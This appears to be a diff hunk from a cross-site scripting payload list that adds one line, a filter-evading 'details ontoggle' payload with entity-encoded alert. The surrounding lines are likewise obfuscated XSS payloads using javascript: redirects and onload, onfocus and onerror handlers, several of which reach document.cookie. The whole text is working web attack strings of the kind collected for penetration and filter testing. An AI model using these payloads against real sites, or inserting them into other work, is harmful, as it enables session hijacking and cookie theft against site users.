@@ -122,6 +122,7 @@ login?redirectUrl=javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520docume
 <svg onload='new Function["Y000!"].find(al\u0065rt)'>
 <sVg OnPointerEnter="location=javas+cript:ale+rt%2+81%2+9;//</div">
 <details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle=&#x0000000000061;
+<details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle=&#x0000000000061;lert&#x000000028;origin&#x000029;>
 lert&#x000000028;origin&#x000029;>
 '"><A HRef=\" AutoFocus OnFocus=top/**/?.['ale'%2B'rt'](document%2Bcookie)>
 <Img Src=OnXSS OnError=confirm(document.cookie)>
